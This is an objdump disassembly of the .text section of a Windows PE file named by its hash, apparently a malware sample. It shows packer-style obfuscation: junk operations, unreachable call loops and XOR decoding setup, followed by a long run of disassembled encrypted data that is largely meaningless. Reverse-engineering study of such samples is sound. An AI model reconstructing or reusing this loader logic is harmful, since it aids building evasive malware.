
66049452497c019d0bdb37634242d77f878fec0ca3d06e2947590e86e6f4bf8e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e87,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e87,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9b,0x10
  401025:	cmp    DWORD PTR ds:0x428e9b,0x0
  40102c:	je     0x40107b
  401032:	cmp    DWORD PTR ds:0x428e9b,0x3
  401039:	jb     0x40107b
  40103f:	jmp    0x40104f
  401044:	push   0x428000
  401049:	call   DWORD PTR ds:0x42a9cb
  40104f:	cmp    DWORD PTR ds:0x428e9b,0x4
  401056:	jne    0x401069
  40105c:	mov    edi,DWORD PTR ds:0x428e9b
  401062:	dec    edi
  401063:	mov    DWORD PTR ds:0x428e9b,edi
  401069:	mov    edi,DWORD PTR ds:0x428e9b
  40106f:	dec    edi
  401070:	mov    DWORD PTR ds:0x428e9b,edi
  401076:	jmp    0x401025
  40107b:	mov    esi,0x75108af
  401080:	xor    eax,esi
  401082:	mov    DWORD PTR ds:0x428e87,0x16
  40108c:	cmp    DWORD PTR ds:0x428e87,0x0
  401093:	je     0x4010c8
  401099:	cmp    DWORD PTR ds:0x428e87,0x25
  4010a0:	jge    0x4010c8
  4010a6:	jmp    0x4010b6
  4010ab:	push   0x428189
  4010b0:	call   DWORD PTR ds:0x42a9cf
  4010b6:	mov    ecx,DWORD PTR ds:0x428e87
  4010bc:	dec    ecx
  4010bd:	mov    DWORD PTR ds:0x428e87,ecx
  4010c3:	jmp    0x40108c
  4010c8:	mov    edi,0x3272f6
  4010cd:	or     ecx,DWORD PTR ds:0x428ec7
  4010d3:	add    eax,edi
  4010d5:	mov    DWORD PTR [ebp-0x40],eax
  4010d8:	xor    eax,DWORD PTR ds:0x428e5f
  4010de:	mov    eax,ds:0x4281f3
  4010e3:	and    DWORD PTR ds:0x428ea7,0x31f0
  4010ed:	mov    eax,DWORD PTR [eax]
  4010ef:	sub    DWORD PTR ds:0x428e27,0x491
  4010f9:	mov    DWORD PTR [ebp-0x3c],eax
  4010fc:	mov    eax,ds:0x428403
  401101:	and    DWORD PTR ds:0x428e2f,ecx
  401107:	mov    eax,DWORD PTR [eax]
  401109:	mov    DWORD PTR [ebp-0x1c],eax
  40110c:	xor    DWORD PTR ds:0x428ec7,edx
  401112:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401119:	and    DWORD PTR ds:0x428eb7,0x0
  401123:	jmp    0x401136
  401128:	xor    eax,eax
  40112a:	xor    eax,DWORD PTR ds:0x428eb7
  401130:	inc    eax
  401131:	mov    ds:0x428eb7,eax
  401136:	cmp    DWORD PTR ds:0x428eb7,0x14
  40113d:	jae    0x401165
  401143:	cmp    DWORD PTR ds:0x428eb7,0x1b
  40114a:	jl     0x401165
  401150:	jmp    0x401160
  401155:	push   0x83c7
  40115a:	call   DWORD PTR ds:0x42a9d3
  401160:	jmp    0x401128
  401165:	mov    eax,DWORD PTR [ebp-0x34]
  401168:	and    ecx,DWORD PTR ds:0x428e2f
  40116e:	xor    eax,esi
  401170:	add    ecx,DWORD PTR ds:0x428ebf
  401176:	add    eax,edi
  401178:	sub    DWORD PTR ds:0x428e8f,0x1eb6
  401182:	mov    DWORD PTR [ebp-0x40],eax
  401185:	mov    eax,ds:0x428373
  40118a:	mov    DWORD PTR [ebp-0x40],eax
  40118d:	mov    DWORD PTR ds:0x428e97,0x16
  401197:	cmp    DWORD PTR ds:0x428e97,0x0
  40119e:	je     0x4011e9
  4011a4:	cmp    DWORD PTR ds:0x428e97,0x6
  4011ab:	jbe    0x4011e9
  4011b1:	jmp    0x4011c1
  4011b6:	push   0x4280f7
  4011bb:	call   DWORD PTR ds:0x42a9db
  4011c1:	cmp    DWORD PTR ds:0x428e97,0x7
  4011c8:	jne    0x4011d9
  4011ce:	mov    eax,ds:0x428e97
  4011d3:	dec    eax
  4011d4:	mov    ds:0x428e97,eax
  4011d9:	mov    eax,ds:0x428e97
  4011de:	dec    eax
  4011df:	mov    ds:0x428e97,eax
  4011e4:	jmp    0x401197
  4011e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4011ec:	sbb    DWORD PTR ds:0x428ea7,0x187d
  4011f6:	mov    DWORD PTR [ebp-0x14],eax
  4011f9:	not    eax
  4011fb:	mov    eax,DWORD PTR [ebp-0x14]
  4011fe:	push   0x4
  401200:	mov    DWORD PTR ds:0x428e83,0x1e
  40120a:	cmp    DWORD PTR ds:0x428e83,0x0
  401211:	je     0x401260
  401217:	cmp    DWORD PTR ds:0x428e83,0x7
  40121e:	jle    0x401260
  401224:	jmp    0x401234
  401229:	push   0x2582
  40122e:	call   DWORD PTR ds:0x42a9df
  401234:	cmp    DWORD PTR ds:0x428e83,0x8
  40123b:	jne    0x40124e
  401241:	mov    ecx,DWORD PTR ds:0x428e83
  401247:	dec    ecx
  401248:	mov    DWORD PTR ds:0x428e83,ecx
  40124e:	mov    ecx,DWORD PTR ds:0x428e83
  401254:	dec    ecx
  401255:	mov    DWORD PTR ds:0x428e83,ecx
  40125b:	jmp    0x40120a
  401260:	pop    ecx
  401261:	sub    ecx,eax
  401263:	sub    eax,0x50fd
  401268:	add    ecx,DWORD PTR [ebp-0x1c]
  40126b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401272:	mov    DWORD PTR ds:0x428e63,0x13
  40127c:	cmp    DWORD PTR ds:0x428e63,0x0
  401283:	je     0x4012b6
  401289:	cmp    DWORD PTR ds:0x428e63,0x16
  401290:	jb     0x4012b6
  401296:	jmp    0x4012a6
  40129b:	push   0x428000
  4012a0:	call   DWORD PTR ds:0x42a9e3
  4012a6:	mov    eax,ds:0x428e63
  4012ab:	dec    eax
  4012ac:	mov    ds:0x428e63,eax
  4012b1:	jmp    0x40127c
  4012b6:	mov    DWORD PTR [ebp-0x18],ecx
  4012b9:	movzx  eax,WORD PTR ds:0x428e73
  4012c0:	sub    DWORD PTR ds:0x428e93,eax
  4012c6:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  4012d0:	mov    eax,DWORD PTR [ebp-0x14]
  4012d3:	xor    DWORD PTR ds:0x428ec7,0x428e57
  4012dd:	mov    DWORD PTR [ebp-0x9c],eax
  4012e3:	mov    eax,DWORD PTR [ebp-0x18]
  4012e6:	mov    DWORD PTR [ebp-0x98],eax
  4012ec:	mov    eax,DWORD PTR [ebp-0x2c]
  4012ef:	adc    DWORD PTR ds:0x428ec7,0x7160
  4012f9:	xor    eax,esi
  4012fb:	sbb    DWORD PTR ds:0x428e3b,0x6908
  401305:	add    eax,edi
  401307:	or     DWORD PTR ds:0x428e2b,0x5a5f
  401311:	mov    DWORD PTR [ebp-0x94],eax
  401317:	not    DWORD PTR ds:0x428e47
  40131d:	lea    eax,[ebp-0x48]
  401320:	mov    DWORD PTR [ebp-0x90],eax
  401326:	adc    DWORD PTR ds:0x428ea7,edx
  40132c:	mov    eax,DWORD PTR [ebp-0xa0]
  401332:	or     DWORD PTR ds:0x428e57,0x428e77
  40133c:	xor    eax,esi
  40133e:	or     DWORD PTR ds:0x428e7f,0x24f1
  401348:	add    eax,edi
  40134a:	or     DWORD PTR ds:0x428e73,0x428e63
  401354:	mov    DWORD PTR [ebp-0xa0],eax
  40135a:	adc    DWORD PTR ds:0x428e63,0x428e67
  401364:	lea    eax,[ebp-0xa0]
  40136a:	push   eax
  40136b:	neg    eax
  40136d:	mov    eax,DWORD PTR [ebp+0xc]
  401370:	sub    DWORD PTR ds:0x428ecf,0x428e77
  40137a:	xor    eax,esi
  40137c:	xor    DWORD PTR ds:0x428ecf,0x428e67
  401386:	add    eax,edi
  401388:	sub    DWORD PTR ds:0x428e9f,0x428e77
  401392:	push   eax
  401393:	mov    eax,ds:0x428393
  401398:	add    DWORD PTR ds:0x428e73,0x428eb7
  4013a2:	push   0x4282e9
  4013a7:	or     DWORD PTR ds:0x428e47,0x49f0
  4013b1:	push   DWORD PTR [eax]
  4013b3:	or     DWORD PTR ds:0x428e47,0x428e5b
  4013bd:	call   0x4061d0
  4013c2:	sbb    edx,0x761a
  4013c8:	mov    ebx,DWORD PTR [ebp-0x14]
  4013cb:	adc    eax,edx
  4013cd:	mov    eax,DWORD PTR [ebp-0x18]
  4013d0:	mov    edx,DWORD PTR ds:0x428ec7
  4013d6:	adc    edx,DWORD PTR ds:0x428e37
  4013dc:	mov    DWORD PTR ds:0x428ec7,edx
  4013e2:	mov    DWORD PTR [ebp-0x58],eax
  4013e5:	movzx  eax,WORD PTR ds:0x428e5f
  4013ec:	and    DWORD PTR ds:0x428e23,eax
  4013f2:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  4013f9:	mov    eax,0xf89c85a3
  4013fe:	mov    DWORD PTR [ebp-0x1c],eax
  401401:	sbb    DWORD PTR ds:0x428ec7,0x20b
  40140b:	lea    ecx,[eax+0x2]
  40140e:	sbb    DWORD PTR ds:0x428e87,ebx
  401414:	mov    DWORD PTR [ebp-0x28],ecx
  401417:	mov    DWORD PTR [ebp-0x10],0xf89c85a4
  40141e:	sbb    edx,0x4ac2
  401424:	mov    DWORD PTR [ebp-0x8],eax
  401427:	sbb    DWORD PTR ds:0x428ecb,edx
  40142d:	mov    eax,DWORD PTR [ebp-0x10]
  401430:	and    DWORD PTR ds:0x428eb7,0x0
  40143a:	mov    edx,DWORD PTR ds:0x428eb7
  401440:	inc    edx
  401441:	mov    DWORD PTR ds:0x428eb7,edx
  401447:	cmp    DWORD PTR ds:0x428eb7,0x21
  40144e:	jbe    0x401471
  401454:	jmp    0x401464
  401459:	push   0x73f7
  40145e:	call   DWORD PTR ds:0x42a9e7
  401464:	cmp    DWORD PTR ds:0x428eb7,0x19
  40146b:	jb     0x40143a
  401471:	xor    eax,esi
  401473:	mov    edx,0xffcd8d8a
  401478:	add    DWORD PTR ds:0x428ec3,0x428e5b
  401482:	sub    edx,eax
  401484:	mov    DWORD PTR ds:0x428e43,0xef0
  40148e:	mov    DWORD PTR [ebp-0xc],edx
  401491:	not    eax
  401493:	mov    DWORD PTR [ebp-0x18],0xf89c85a0
  40149a:	mov    eax,DWORD PTR [ebp-0x8]
  40149d:	mov    DWORD PTR [ebp-0x3c],ebx
  4014a0:	mov    DWORD PTR ds:0x428e7f,0x7ee3
  4014aa:	cmp    eax,ecx
  4014ac:	mov    DWORD PTR ds:0x428ea7,0x6a4b
  4014b6:	je     0x403bac
  4014bc:	jmp    0x403815
  4014c1:	mov    ebp,0x855ffdc7
  4014c6:	inc    ebp
  4014c7:	popf   
  4014c8:	test   DWORD PTR [eax+0x50a705df],esi
  4014ce:	sub    DWORD PTR ds:0x838383e7,ebp
  4014d4:	add    DWORD PTR [edi+0x60],0xffffff83
  4014d8:	sub    DWORD PTR [edx],0x31
  4014db:	sub    BYTE PTR [esi],bh
  4014dd:	cmp    ah,BYTE PTR es:[eax+esi*1]
  4014e1:	jp     0x401520
  4014e3:	jbe    0x40155c
  4014e5:	retf   
  4014e6:	jae    0x40155a
  4014e8:	jae    0x40155c
  4014ea:	dec    ebx
  4014eb:	(bad)  
  4014ed:	(bad)  
  4014ee:	ins    DWORD PTR es:[edi],dx
  4014ef:	push   ebp
  4014f0:	je     0x401570
  4014f2:	lods   eax,DWORD PTR fs:[esi]
  4014f4:	jge    0x401568
  4014f6:	data16 shl BYTE PTR [edx+0x53],1
  4014fa:	cmp    eax,0x87980391
  4014ff:	push   0x8d488052
  401504:	mov    bh,0x80
  401506:	mov    ebp,0x3144bb
  40150b:	ja     0x4014ee
  40150d:	add    ebp,DWORD PTR [eax+eax*4+0x1f]
  401511:	repnz inc esi
  401513:	rol    bl,cl
  401515:	repnz cwde 
  401517:	sub    al,0xdf
  401519:	xchg   esp,eax
  40151a:	adc    BYTE PTR ss:[esi-0x4c],ah
  40151e:	xchg   ebx,eax
  40151f:	(bad)  [eax]
  401521:	jb     0x401505
  401523:	sbb    ecx,ebp
  401525:	lsl    esi,WORD PTR [edi]
  401528:	and    eax,0x74371155
  40152d:	jne    0x4014f5
  40152f:	mov    al,0x2c
  401531:	pop    esi
  401532:	sbb    dh,BYTE PTR [edi+0x3456f600]
  401538:	mov    DWORD PTR [ebx-0x2b],ecx
  40153b:	fs push es
  40153d:	and    eax,DWORD PTR [ebx]
  40153f:	test   DWORD PTR [esi+0x60a5e27c],edi
  401545:	xchg   esp,eax
  401546:	mov    esi,0x4e9b2918
  40154b:	or     al,0x9f
  40154d:	inc    ecx
  40154e:	mov    ecx,DWORD PTR [esp+edx*1-0x6d94cd1d]
  401555:	dec    ecx
  401556:	dec    esp
  401557:	imul   edi,esp,0x963693d0
  40155d:	int    0xc8
  40155f:	rcl    DWORD PTR [ebp+0x6b5af96e],1
  401565:	push   ecx
  401566:	adc    DWORD PTR [edi],edi
  401568:	or     al,0x47
  40156a:	sbb    al,0xb2
  40156c:	push   esp
  40156d:	sar    DWORD PTR [eax+0x6719dd4d],cl
  401573:	add    ch,BYTE PTR [ebx+0x67]
  401576:	mov    edx,0x5c07506
  40157b:	dec    eax
  40157c:	ret    
  40157d:	jbe    0x401512
  40157f:	shr    edx,0xe0
  401582:	sub    DWORD PTR [eax+0x46],ebx
  401585:	pop    ss
  401586:	xor    al,0x1b
  401588:	mov    eax,0x2a3c1ee4
  40158d:	test   eax,0xbf59fee1
  401592:	inc    ebx
  401593:	inc    esp
  401594:	xchg   ecx,eax
  401595:	lods   eax,DWORD PTR ds:[esi]
  401596:	adc    BYTE PTR [esi-0x23a767bc],bl
  40159c:	and    ebx,DWORD PTR [esi]
  40159e:	sbb    BYTE PTR [edx],bl
  4015a0:	inc    eax
  4015a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015a2:	cmc    
  4015a3:	push   edi
  4015a4:	dec    ebp
  4015a5:	ja     0x4015f2
  4015a7:	in     al,dx
  4015a8:	mov    eax,0x79dba110
  4015ad:	push   ecx
  4015ae:	inc    ebx
  4015af:	data16 sub BYTE PTR [edx*8-0x761c5df9],0xf4
  4015b8:	mov    dh,0x5
  4015ba:	(bad)  
  4015bc:	adc    BYTE PTR [edx],al
  4015be:	xchg   ecx,eax
  4015bf:	and    DWORD PTR ds:0x2bfa3604,esp
  4015c5:	jge    0x4015ec
  4015c7:	clc    
  4015c8:	inc    esi
  4015c9:	fld    TBYTE PTR [edi-0x34]
  4015cc:	xchg   esp,edi
  4015ce:	aad    0x2a
  4015d0:	ja     0x401588
  4015d2:	mov    BYTE PTR [edx+0x44],0x37
  4015d6:	fs and dh,cl
  4015d9:	repnz xlat BYTE PTR ds:[ebx]
  4015db:	mov    ds:0xb07dc4e,al
  4015e0:	sub    BYTE PTR [eax],0xc4
  4015e3:	push   ebp
  4015e4:	pop    ss
  4015e5:	in     eax,0x5a
  4015e7:	jmp    0x98a3:0xfd4892a4
  4015ee:	sti    
  4015ef:	icebp  
  4015f0:	out    0x4b,al
  4015f2:	or     DWORD PTR [ebp*1+0x74c757ad],edx
  4015f9:	push   ebp
  4015fa:	loopne 0x401669
  4015fc:	xchg   esp,eax
  4015fd:	daa    
  4015fe:	or     bh,BYTE PTR [eax+0x67]
  401601:	jns    0x40159e
  401603:	push   ebp
  401604:	push   ds
  401605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401606:	lods   al,BYTE PTR ds:[esi]
  401607:	pop    edx
  401608:	je     0x401618
  40160a:	sub    edx,ebp
  40160c:	dec    ebp
  40160d:	cmp    dh,BYTE PTR [edx+0x7f]
  401610:	push   0x60
  401612:	lahf   
  401613:	pop    ebp
  401614:	repz pop ebp
  401616:	push   esi
  401617:	xor    dl,bh
  401619:	arpl   si,sp
  40161b:	mov    ebx,0xfc2d858
  401620:	sub    ah,cl
  401622:	out    dx,ax
  401624:	jle    0x4015e9
  401626:	adc    al,0xde
  401628:	inc    edi
  401629:	leave  
  40162a:	test   eax,0x7cdd9d9
  40162f:	ficomp DWORD PTR [edi]
  401631:	sub    al,0xf6
  401633:	fs push 0x6708e8af
  401639:	sbb    edx,DWORD PTR [eax+0x703c4cf4]
  40163f:	cld    
  401640:	dec    edx
  401641:	mov    gs:0x9b2330f7,al
  401647:	and    al,0xc6
  401649:	add    edx,ebx
  40164b:	imul   BYTE PTR [bx+di-0x26]
  40164f:	test   al,0xe6
  401651:	mov    DWORD PTR [eax+0x7b],ebx
  401654:	pop    ebp
  401655:	jmp    0x4015ef
  401657:	push   edx
  401658:	cmp    DWORD PTR [ecx+0x47],ebp
  40165b:	dec    ecx
  40165c:	es jns 0x401616
  40165f:	mov    ecx,0xb921a3c5
  401664:	inc    eax
  401665:	aas    
  401666:	mov    bh,0xdf
  401668:	mov    ?,WORD PTR [eax-0x79b2661b]
  40166e:	push   cs
  40166f:	push   ecx
  401670:	call   0x4335e637
  401675:	es push edx
  401677:	push   ds
  401678:	add    BYTE PTR [ebp+0x77ab116f],0x16
  40167f:	imul   edx,DWORD PTR [edx+0x1f],0xffffffa6
  401683:	pop    esp
  401684:	dec    eax
  401685:	push   esp
  401686:	dec    esi
  401687:	pop    eax
  401688:	sbb    eax,0x40d9d62a
  40168d:	fsub   DWORD PTR [ebp+0x3c]
  401690:	jmp    0x2830b4cc
  401695:	les    ebx,FWORD PTR [edi]
  401697:	and    bl,ah
  401699:	dec    ecx
  40169a:	int    0x43
  40169c:	cs mov ah,0xb9
  40169f:	mov    WORD PTR [esi+0x60778c55],es
  4016a5:	sbb    BYTE PTR [ebx-0x43],cl
  4016a8:	push   esp
  4016a9:	je     0x401643
  4016ab:	sahf   
  4016ac:	mov    ds:0x74f13331,al
  4016b1:	cmp    BYTE PTR ds:0x92bf1f38,bh
  4016b7:	jb     0x401718
  4016b9:	mov    eax,0x14fd916f
  4016be:	sti    
  4016bf:	push   cs
  4016c0:	nop
  4016c1:	ror    BYTE PTR [esi+0x35],1
  4016c4:	dec    edx
  4016c5:	outs   dx,BYTE PTR ds:[esi]
  4016c6:	sub    eax,0x65970f04
  4016cb:	mov    ebx,0x9b2d5b93
  4016d0:	xor    eax,DWORD PTR [ecx-0x228f73e]
  4016d6:	leave  
  4016d7:	ss std 
  4016d9:	jp     0x4016cc
  4016db:	push   es
  4016dc:	mov    bl,0x97
  4016de:	ret    
  4016df:	les    edx,FWORD PTR [eax-0x5f]
  4016e2:	ror    ebx,cl
  4016e4:	or     BYTE PTR ds:0x38e45f5d,al
  4016ea:	ror    ch,cl
  4016ec:	or     eax,0x3008d9da
  4016f1:	neg    dl
  4016f3:	stc    
  4016f4:	sbb    BYTE PTR [ebp+0x7d46b80e],dh
  4016fa:	outs   dx,BYTE PTR ds:[esi]
  4016fb:	and    al,BYTE PTR [ecx+0x27]
  4016fe:	out    dx,eax
  4016ff:	jmp    0x6a0faddd
  401704:	cmc    
  401705:	xchg   DWORD PTR [ebx+edi*8],eax
  401708:	inc    ebp
  401709:	inc    eax
  40170a:	mov    al,ds:0x621043c5
  40170f:	aad    0x97
  401711:	ja     0x4016a5
  401713:	adc    BYTE PTR [eax],0x57
  401716:	pop    ss
  401717:	es dec eax
  401719:	repz mov al,ds:0xa131ee83
  40171f:	addr16 sub cl,al
  401722:	cmp    cl,BYTE PTR [esi+ebp*2-0x6bf1ff28]
  401729:	aam    0xd3
  40172b:	stc    
  40172c:	ror    BYTE PTR [esi-0x33],1
  40172f:	jmp    0xf8ec2ade
  401734:	mov    edi,0xba890052
  401739:	mov    al,0xaa
  40173b:	repnz pop eax
  40173d:	sub    ebx,DWORD PTR [eax-0x33c22aef]
  401743:	fadd   QWORD PTR [ebp+0x1ca9caa2]
  401749:	mov    bh,0xae
  40174b:	mov    edi,0x6f11659f
  401750:	es mov dh,0xe
  401753:	(bad)  
  401754:	hlt    
  401755:	fiadd  WORD PTR [ecx]
  401757:	(bad)  
  401758:	sbb    cl,BYTE PTR [esi-0x6ef1db4b]
  40175e:	rcl    DWORD PTR [esp+eiz*2+0x58],cl
  401762:	fs (bad) 
  401764:	adc    ebp,ecx
  401766:	lods   al,BYTE PTR ds:[esi]
  401767:	and    esp,0xc9b29955
  40176d:	cmp    eax,0xd19d1565
  401772:	das    
  401773:	and    edi,DWORD PTR [edx-0x6ef2ab62]
  401779:	push   ebp
  40177a:	adc    dl,BYTE PTR [ecx-0x243ebb2b]
  401780:	inc    eax
  401781:	jmp    0x4017c8
  401783:	imul   esi,DWORD PTR [ebp-0x3f],0x8
  401787:	in     al,0x78
  401789:	pop    ebx
  40178a:	mov    ds:0xfaec09fa,eax
  40178f:	test   BYTE PTR [eax-0x4c],cl
  401792:	pop    es
  401793:	ror    BYTE PTR [edx+0x58bf75f6],0x50
  40179a:	sub    DWORD PTR [edx-0x1d],0x37
  40179e:	(bad)  
  40179f:	sbb    eax,0x66ed51bb
  4017a4:	into   
  4017a5:	dec    edx
  4017a6:	test   DWORD PTR [ecx],ebp
  4017a8:	fwait
  4017a9:	in     al,dx
  4017aa:	cmp    ebx,0xbc7d3540
  4017b0:	add    DWORD PTR [esi+0x3fe0250d],ebx
  4017b6:	adc    BYTE PTR [edi-0x72c4669b],0x4
  4017bd:	sub    cl,0x91
  4017c0:	leave  
  4017c1:	or     eax,0x69b00df2
  4017c6:	out    dx,eax
  4017c7:	lds    edx,FWORD PTR [edi-0x6]
  4017ca:	bound  ebp,QWORD PTR [edi-0x12]
  4017cd:	inc    edi
  4017ce:	dec    esi
  4017cf:	adc    eax,0x20eb0509
  4017d4:	rcr    cl,cl
  4017d6:	popa   
  4017d7:	sti    
  4017d8:	push   esp
  4017da:	das    
  4017db:	mov    eax,ds:0x32b526de
  4017e0:	add    al,0x4f
  4017e2:	fcom   QWORD PTR [ecx-0x76da60cb]
  4017e8:	jle    0x401810
  4017ea:	rol    ch,cl
  4017ec:	shr    bh,cl
  4017ee:	xchg   ebp,eax
  4017ef:	pushf  
  4017f0:	or     bh,BYTE PTR [edi-0x21]
  4017f3:	sub    ebx,DWORD PTR [ebx+0x69]
  4017f6:	sti    
  4017f7:	ret    
  4017f8:	lock mov esp,esi
  4017fb:	out    0x2e,eax
  4017fd:	xchg   edx,eax
  4017fe:	daa    
  4017ff:	(bad)  
  401801:	jne    0x40183e
  401803:	shr    DWORD PTR [esi-0x71d15eef],cl
  401809:	out    0x67,eax
  40180b:	lods   al,BYTE PTR ds:[esi]
  40180c:	sub    al,0x7
  40180e:	fst    QWORD PTR [edi]
  401810:	and    al,0xed
  401812:	pop    eax
  401813:	jo     0x4017b1
  401815:	outs   dx,DWORD PTR ds:[esi]
  401816:	cmp    DWORD PTR ds:0xc77d803d,edx
  40181c:	call   0x523c:0xd839671e
  401823:	xor    al,0x5f
  401825:	fisub  WORD PTR ds:0xfb499537
  40182b:	cmp    al,0x40
  40182d:	xchg   esi,eax
  40182e:	mov    esi,DWORD PTR [ebx]
  401830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401831:	sub    esi,ecx
  401833:	lock ffreep st(1)
  401836:	les    eax,FWORD PTR [edx-0x1b]
  401839:	loopne 0x401823
  40183b:	inc    ecx
  40183c:	or     eax,0xe6c9d58
  401841:	jbe    0x401805
  401843:	stos   BYTE PTR es:[edi],al
  401844:	ficom  WORD PTR [eax+0x5]
  401847:	mov    eax,ds:0x2985f014
  40184c:	sub    ebx,DWORD PTR ds:0x7d3007fe
  401852:	aas    
  401853:	out    0xa2,eax
  401855:	leave  
  401856:	push   eax
  401857:	dec    edi
  401858:	mov    al,0xab
  40185a:	cmp    DWORD PTR [edx+ecx*2],eax
  40185d:	pusha  
  40185e:	xchg   ecx,eax
  40185f:	mov    ebp,0x425f5673
  401864:	stc    
  401865:	mov    ds:0x79831ce7,eax
  40186a:	leave  
  40186b:	out    dx,al
  40186c:	mov    edx,DWORD PTR [esi+0x21]
  40186f:	leave  
  401870:	lea    esp,[ebx+0x7f]
  401873:	retf   0xc9c1
  401876:	cmp    ax,0xe0b9
  40187a:	int    0x2d
  40187c:	dec    esp
  40187d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40187e:	(bad)  
  40187f:	and    DWORD PTR [ebx+ecx*8+0x20],edi
  401883:	test   al,cl
  401885:	mov    ecx,0x412ae6ee
  40188a:	jle    0x401846
  40188c:	cmp    BYTE PTR [edi+edi*1+0x2868b7d1],cl
  401893:	mov    eax,0xa341dfc0
  401898:	dec    esi
  401899:	jae    0x401900
  40189b:	inc    esp
  40189c:	mov    ecx,DWORD PTR [eax+0x5d]
  40189f:	add    BYTE PTR [edx],cl
  4018a1:	mov    DWORD PTR [ecx],esp
  4018a3:	cmp    eax,DWORD PTR [eax]
  4018a5:	push   eax
  4018a6:	dec    esp
  4018a7:	or     DWORD PTR [ebp-0x70],ebx
  4018aa:	add    eax,0xc12679fc
  4018af:	xor    edx,esi
  4018b1:	xor    dl,BYTE PTR [esi]
  4018b3:	mov    ds:0xa8881bb,eax
  4018b8:	sub    eax,0xc1022696
  4018bd:	inc    esp
  4018be:	arpl   WORD PTR [eax+0x71842844],di
  4018c4:	jne    0x401852
  4018c6:	pop    ss
  4018c7:	rcr    DWORD PTR [eax],cl
  4018c9:	idiv   BYTE PTR [edx+0x53725e6b]
  4018cf:	push   0x3b
  4018d1:	imul   dl
  4018d3:	outs   dx,BYTE PTR ds:[esi]
  4018d4:	pop    eax
  4018d5:	mov    ecx,0x38949408
  4018da:	and    DWORD PTR [esi-0x45],edx
  4018dd:	ror    DWORD PTR ds:0x73f8413,cl
  4018e3:	inc    ebp
  4018e4:	or     BYTE PTR [edi],bl
  4018e6:	out    0x91,al
  4018e8:	xchg   edi,eax
  4018e9:	xchg   BYTE PTR [ebx],al
  4018eb:	arpl   WORD PTR [ecx],dx
  4018ed:	lods   al,BYTE PTR ds:[esi]
  4018ee:	xchg   DWORD PTR gs:[ebx+0x1b0c0742],ebx
  4018f5:	and    al,0xc
  4018f7:	push   edx
  4018f8:	in     al,dx
  4018f9:	stc    
  4018fa:	sub    BYTE PTR [ecx],dh
  4018fc:	pop    ebp
  4018fd:	outs   dx,BYTE PTR ds:[esi]
  4018fe:	into   
  4018ff:	pop    edx
  401900:	addr16 ds adc eax,0xc47db5e2
  401907:	loopne 0x4018d9
  401909:	rol    DWORD PTR [edx+ecx*8],cl
  40190c:	into   
  40190d:	(bad)  
  40190e:	mov    bl,0xfe
  401910:	(bad)  
  401911:	out    0xc5,al
  401913:	jge    0x4018f0
  401915:	sub    esi,eax
  401917:	lods   al,BYTE PTR ds:[esi]
  401918:	pop    ecx
  401919:	pop    ebx
  40191a:	fld    QWORD PTR [ebp-0x68]
  40191d:	out    0xca,al
  40191f:	aam    0x2d
  401921:	push   edx
  401922:	push   0xbd15dbf4
  401927:	cmp    BYTE PTR [esi],cl
  401929:	add    BYTE PTR [ebx-0x12a977a7],dh
  40192f:	sub    ebp,DWORD PTR [edx+0xc977ac]
  401935:	sbb    eax,0xc08205f5
  40193a:	in     eax,dx
  40193b:	inc    esi
  40193c:	stos   BYTE PTR es:[edi],al
  40193d:	sbb    eax,0xaff56f7e
  401942:	add    ah,dl
  401944:	mov    eax,0x97b990e9
  401949:	jns    0x4019a2
  40194b:	xchg   edi,eax
  40194c:	repz mov eax,DWORD PTR [ecx-0x4e]
  401950:	call   0x4c93:0x98fe4325
  401957:	into   
  401958:	push   eax
  401959:	loope  0x4019ab
  40195b:	jl     0x40190f
  40195d:	mov    ebp,0xd0647730
  401962:	cld    
  401963:	popa   
  401964:	fisub  DWORD PTR [ebx+0x77e7429b]
  40196a:	push   esp
  40196b:	sar    BYTE PTR [ecx-0x59],cl
  40196e:	ret    
  40196f:	xchg   ecx,eax
  401970:	sbb    al,BYTE PTR [edi+0x3d]
  401973:	or     al,0x6
  401975:	sub    ah,BYTE PTR [edx-0x14c10a47]
  40197b:	jmp    0x40199c
  40197d:	sub    bh,BYTE PTR [esi]
  40197f:	mov    edx,edx
  401981:	sub    cl,bh
  401983:	inc    edi
  401984:	xchg   esp,eax
  401985:	jno    0x401922
  401987:	cmp    DWORD PTR [esi],eax
  401989:	dec    ebp
  40198a:	mov    WORD PTR [ebx+0x5f],?
  40198d:	jle    0x4019ab
  40198f:	pop    eax
  401990:	inc    edi
  401991:	sbb    DWORD PTR [edi+ecx*8+0x5c],ebx
  401995:	(bad)  
  401996:	imul   edi,DWORD PTR cs:[esi-0x2124c5d7],0x3b
  40199e:	in     eax,0xde
  4019a0:	pop    ds
  4019a1:	or     eax,0x9db992f9
  4019a6:	pop    ds
  4019a7:	xchg   BYTE PTR [edx],al
  4019a9:	dec    esp
  4019aa:	xor    ch,BYTE PTR [edx+0x2a909c04]
  4019b0:	loop   0x401a18
  4019b2:	mov    bl,0x6b
  4019b4:	jo     0x401a24
  4019b6:	retf   0xd406
  4019b9:	add    eax,0x459fd3c2
  4019be:	push   ecx
  4019bf:	xor    al,0x1a
  4019c1:	jns    0x401980
  4019c3:	mov    DWORD PTR [edx-0x35b45104],ecx
  4019c9:	ds pop ds
  4019cb:	push   es
  4019cc:	fs cli 
  4019ce:	mov    bh,0x4d
  4019d0:	ret    
  4019d1:	fsubrp st(5),st
  4019d3:	or     ecx,DWORD PTR [ebx]
  4019d5:	repz iret 
  4019d7:	push   esi
  4019d8:	aaa    
  4019d9:	adc    dh,dh
  4019db:	jle    0x401a2a
  4019dd:	inc    ebp
  4019de:	iret   
  4019df:	add    DWORD PTR [edx],0x398d6b13
  4019e5:	jb     0x401a51
  4019e7:	dec    esp
  4019e8:	lea    edi,[ebp+0x7c5dfd81]
  4019ee:	popa   
  4019ef:	les    edi,FWORD PTR [ecx]
